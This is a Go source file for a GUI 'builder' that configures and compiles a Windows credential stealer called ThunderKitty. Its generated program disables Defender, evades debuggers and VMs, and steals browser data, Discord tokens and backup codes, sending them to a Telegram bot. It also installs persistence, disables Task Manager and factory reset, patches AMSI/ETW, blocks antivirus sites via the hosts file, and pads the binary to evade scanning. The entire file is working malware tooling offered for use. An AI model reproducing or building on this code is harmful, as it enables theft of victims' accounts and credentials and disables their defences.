package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"text/template"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

type Config struct {
	TeleBotToken        string
	TeleChatID          string
	EnableAntiDebug     bool
	EnableFakeError     bool
	EnableBrowsers      bool
	HideConsole         bool
	DisableFactoryReset bool
	DisableTaskManager  bool
	BlockHostsFile      bool
	OpenSiteURL         string
	SpeakTTSMessage     string
	SwapMouse           bool
	PatchPowerShell     bool
	EnablePersistence   bool
	StealBackupCodes    bool
	SetWallpaper        bool
	EnableTokenGrabber  bool
	DMMessage           string
	FilePumperSize      string
}

func buildExecutable(cfg Config) {
	const templateContent = `
package main

import (
	"ThunderKitty-Grabber/utils/sysinfo"
	"ThunderKitty-Grabber/utils/hideconsole"
	"ThunderKitty-Grabber/utils/antidbgandvm"
	"ThunderKitty-Grabber/utils/mutex"
	"ThunderKitty-Grabber/utils/fakeerror"
	"ThunderKitty-Grabber/utils/browsers"
	"ThunderKitty-Grabber/utils/tokengrabber"
	"ThunderKitty-Grabber/utils/backupcodes"
	"ThunderKitty-Grabber/utils/disablefactoryreset"
	"ThunderKitty-Grabber/utils/taskmanager"
	"ThunderKitty-Grabber/utils/persistence"
	"ThunderKitty-Grabber/utils/hosts"
	"ThunderKitty-Grabber/utils/exclude"
	"ThunderKitty-Grabber/utils/defender"
	"ThunderKitty-Grabber/utils/powershellpatcher"
	"ThunderKitty-Grabber/utils/wallpaperchanger"
	"fmt"
	"os/exec"
	"sync"
)

const (
	TelegramBotToken = "{{.TeleBotToken}}"
	TelegramChatId   = "{{.TeleChatID}}"
)

func main() {
	var wg sync.WaitGroup
	
 	if {{.HideConsole}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			HideConsole.Hide()
		}()
	} else {
		fmt.Println("Hide console not enabled")
	}

 	if {{.EnableAntiDebug}} {
		AntiDebugVMAnalysis.ThunderKitty()
	} else {
		fmt.Println("Anti-debugging and VM analysis not enabled")
	}

	if {{.EnableFakeError}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			FakeError.Show()
		}()
	} else {
		fmt.Println("Fake error not enabled")
	}

	wg.Add(1)
	go func() {
		defer wg.Done()
		Exclude.ExcludeDrive()
	}()

	wg.Add(1)
	go func() {
		defer wg.Done()
		Defender.Disable()
	}()

	wg.Add(1)
	go func() {
		defer wg.Done()
		Mutex.Create()
	}()

	wg.Add(1)
	go func() {
		defer wg.Done()
		SysInfo.Fetch(TelegramBotToken, TelegramChatId)
	}()

	if {{.EnableBrowsers}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			browsers.ThunderKittyGrab(TelegramBotToken, TelegramChatId)
		}()
	} else {
		fmt.Println("Browser info grabbing not enabled")
	}
	
	if {{.EnableTokenGrabber}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			TokenGrabber.Run(TelegramBotToken, TelegramChatId, "{{.DMMessage}}")
		}()
	} else {
		fmt.Println("Discord token grabbing not enabled")
	}

	if {{.StealBackupCodes}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			BackupCodes.Search()
		}()
	} else {
		fmt.Println("Discord backup code recovery disabled")
	}

	if {{.DisableFactoryReset}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			FactoryReset.Disable()
		}()
	} else {
		fmt.Println("Factory reset not disabled")
	}

	if {{.DisableTaskManager}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			TaskManager.Disable()
		}()
	} else {
		fmt.Println("Task manager not disabled")
	}

	if {{.EnablePersistence}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			Persistence.Create()
		}()
	} else {
		fmt.Println("Persistence not enabled")
	}

	if {{.BlockHostsFile}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			Hosts.Infect()
		}()
	} else {
		fmt.Println("Block hosts file not enabled")
	}
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		url := "{{.OpenSiteURL}}"
		if url != "" {
			exec.Command("cmd.exe", "/c", "start", url).Run()
		} else {
			fmt.Println("Open website not enabled")
		}
	}()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		ttsMessage := "{{.SpeakTTSMessage}}"
		if ttsMessage != "" {
			exec.Command("PowerShell", "-Command", "(New-Object -ComObject SAPI.SpVoice).Speak(\"" + ttsMessage + "\")").Run()
		} else {
			fmt.Println("TTS not enabled")
		}
	}()

	wg.Add(1)
	go func() {
		defer wg.Done()
		if {{.SwapMouse}} {
			exec.Command("cmd", "/c", "rundll32.exe", "user32.dll,SwapMouseButton").Run()
		} else {
			fmt.Println("Swap mouse not enabled")
		}
	}()

	if {{.PatchPowerShell}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			PowerShellPatcher.Patch()
		}()
	} else {
		fmt.Println("PowerShell patcher not enabled")
	}

	if {{.SetWallpaper}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			WallpaperChanger.DownloadAndSetWallpaper()
		}()
	} else {
		fmt.Println("Wallpaper changer not enabled")
	}

	wg.Wait()
}
`

	tmpl, err := template.New("main").Parse(templateContent)
	if err != nil {
		fmt.Println("Error parsing template:", err)
		return
	}

	file, err := os.Create("main.go")
	if err != nil {
		fmt.Println("Error creating main.go:", err)
		return
	}
	defer file.Close()

	err = tmpl.Execute(file, cfg)
	if err != nil {
		fmt.Println("Error executing template:", err)
		return
	}

	ldflags := "-s -w"
	if cfg.HideConsole {
		ldflags += " -H=windowsgui"
	}
	cmd := exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "-o", "ThunderKitty-Built.exe", "main.go")

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err = cmd.Run()
	if err != nil {
		fmt.Println("Error building executable:", err)
		return
	}

	fmt.Println("Build successful")
}

func pumpExecutable(path string, size int) {
	file, err := os.ReadFile(path)
	if err != nil {
		panic(err)
	}

	size = size * 1024 * 1024 // Convert to MB

	pumpAmount := size - len(file)
	if pumpAmount <= 0 {
		return
	}

	zeroBytes := make([]byte, pumpAmount)
	err = os.WriteFile(path, append(file, zeroBytes...), 0600)
	if err != nil {
		return
	}

	return
}

func SaveConfig(cfg Config) error {
	file, err := os.Create("config.json")
	if err != nil {
		return err
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	if err := encoder.Encode(cfg); err != nil {
		return err
	}

	return nil
}

func LoadConfig() (Config, error) {
	var cfg Config

	file, err := os.Open("config.json")
	if err != nil {
		if os.IsNotExist(err) {
			return cfg, nil // No config file, return default config
		}
		return cfg, err
	}
	defer file.Close()

	decoder := json.NewDecoder(file)
	if err := decoder.Decode(&cfg); err != nil {
		return cfg, err
	}

	return cfg, nil
}

func main() {
	a := app.New()
	w := a.NewWindow("ThunderKitty Builder")

	// Load a config if it exists
	cfg, err := LoadConfig()
	if err != nil {
		fmt.Println("Error loading config:", err)
	}

	// Creating all the widgets
	// Grabber Widgets
	telegramBotTokenEntry := widget.NewEntry()
	telegramBotTokenEntry.SetPlaceHolder("Enter Telegram Bot Token")
	telegramBotTokenEntry.SetText(cfg.TeleBotToken)

	telegramChatIdEntry := widget.NewEntry()
	telegramChatIdEntry.SetPlaceHolder("Enter Telegram Chat ID")
	telegramChatIdEntry.SetText(cfg.TeleChatID)

	enableAntiDebug := widget.NewCheck("Enable Anti-Debugging", nil)
	enableAntiDebug.SetChecked(cfg.EnableAntiDebug)

	enableFakeError := widget.NewCheck("Enable Fake Error", nil)
	enableFakeError.SetChecked(cfg.EnableFakeError)

	enableBrowsers := widget.NewCheck("Enable Browser Info Grabbing", nil)
	enableBrowsers.SetChecked(cfg.EnableBrowsers)

	enableTokenGrabber := widget.NewCheck("Enable Token Grabbing", nil)
	enableTokenGrabber.SetChecked(cfg.EnableTokenGrabber)

	stealBackupCodes := widget.NewCheck("Steal Discord Backup Codes", nil)
	stealBackupCodes.SetChecked(cfg.StealBackupCodes)

	hideConsole := widget.NewCheck("Hide Console Window", nil)
	hideConsole.SetChecked(cfg.HideConsole)

	disableFactoryReset := widget.NewCheck("Disable Factory Reset", nil)
	disableFactoryReset.SetChecked(cfg.DisableFactoryReset)

	disableTaskManager := widget.NewCheck("Disable Task Manager", nil)
	disableTaskManager.SetChecked(cfg.DisableTaskManager)

	blockHostsFile := widget.NewCheck("Block AV Sites", nil)
	blockHostsFile.SetChecked(cfg.BlockHostsFile)

	patchPowershell := widget.NewCheck("Patch PowerShell (AMSI & ETW)", nil)
	patchPowershell.SetChecked(cfg.PatchPowerShell)

	enablePersistence := widget.NewCheck("Enable Persistence", nil)
	enablePersistence.SetChecked(cfg.EnablePersistence)

	// Trollware Widgets
	openSiteEntry := widget.NewEntry()
	openSiteEntry.SetPlaceHolder("Open Website (leave blank for none)")
	openSiteEntry.SetText(cfg.OpenSiteURL)

	speakTTSEntry := widget.NewEntry()
	speakTTSEntry.SetPlaceHolder("Text-to-speech Message (leave blank for none)")
	speakTTSEntry.SetText(cfg.SpeakTTSMessage)

	enableSwapMouse := widget.NewCheck("Swap Mouse Buttons", nil)
	enableSwapMouse.SetChecked(cfg.SwapMouse)

	setWallpaper := widget.NewCheck("Enable Wallpaper Changer", nil)
	setWallpaper.SetChecked(cfg.SetWallpaper)

	sendDMMessage := widget.NewEntry()
	sendDMMessage.SetPlaceHolder("Spam Discord Messages (leave blank for none)")
	sendDMMessage.SetText(cfg.DMMessage)

	// File Pumper Widgets
	filePumperEntry := widget.NewEntry()
	filePumperEntry.SetPlaceHolder("Pump File (size in MB)")
	filePumperEntry.SetText(cfg.FilePumperSize)

	// Build button
	buildButton := widget.NewButton("Build", func() {

		// Delete old file
		os.Remove("ThunderKitty-Built.exe")

		// Build the new one
		cfg := Config{
			TeleBotToken:        telegramBotTokenEntry.Text,
			TeleChatID:          telegramChatIdEntry.Text,
			EnableAntiDebug:     enableAntiDebug.Checked,
			EnableFakeError:     enableFakeError.Checked,
			EnableBrowsers:      enableBrowsers.Checked,
			HideConsole:         hideConsole.Checked,
			DisableFactoryReset: disableFactoryReset.Checked,
			DisableTaskManager:  disableTaskManager.Checked,
			BlockHostsFile:      blockHostsFile.Checked,
			OpenSiteURL:         openSiteEntry.Text,
			SpeakTTSMessage:     speakTTSEntry.Text,
			SwapMouse:           enableSwapMouse.Checked,
			PatchPowerShell:     patchPowershell.Checked,
			EnablePersistence:   enablePersistence.Checked,
			StealBackupCodes:    stealBackupCodes.Checked,
			SetWallpaper:        setWallpaper.Checked,
			EnableTokenGrabber:  enableTokenGrabber.Checked,
			DMMessage:           sendDMMessage.Text,
			FilePumperSize:      filePumperEntry.Text,
		}

		buildExecutable(cfg)

		// Save config
		if err := SaveConfig(cfg); err != nil {
			fmt.Println("Error saving config:", err)
		}

		// Pumper
		if filePumperEntry.Text != "" {
			pumpSize, err := strconv.Atoi(filePumperEntry.Text)
			if err != nil {
				panic(err)
			}

			pumpExecutable("main.exe", pumpSize)
		}
	})

	grabberSettings := container.NewVBox(
		widget.NewLabel("ThunderKitty Configuration"),
		telegramBotTokenEntry,
		telegramChatIdEntry,
		enableAntiDebug,
		enableFakeError,
		enableBrowsers,
		enableTokenGrabber,
		stealBackupCodes,
		hideConsole,
		enablePersistence,
		buildButton,
	)

	trollwareSettings := container.NewVBox(
		widget.NewLabel("Trollware Configuration"),
		openSiteEntry,
		speakTTSEntry,
		enableSwapMouse,
		setWallpaper,
		sendDMMessage,
	)

	miscellaneousSettings := container.NewVBox(
		widget.NewLabel("Miscellaneous Configuration"),
		disableTaskManager,
		disableFactoryReset,
		patchPowershell,
		blockHostsFile,
	)

	fileSettings := container.NewVBox(
		widget.NewLabel("File Configuration"),
		filePumperEntry,
	)

	tabs := container.NewAppTabs(
		container.NewTabItem("Grabber", grabberSettings),
		container.NewTabItem("Trollware", trollwareSettings),
		container.NewTabItem("Miscellaneous", miscellaneousSettings),
		container.NewTabItem("File", fileSettings),
	)

	w.SetContent(tabs)
	w.Resize(fyne.NewSize(500, 350))
	w.ShowAndRun()
}
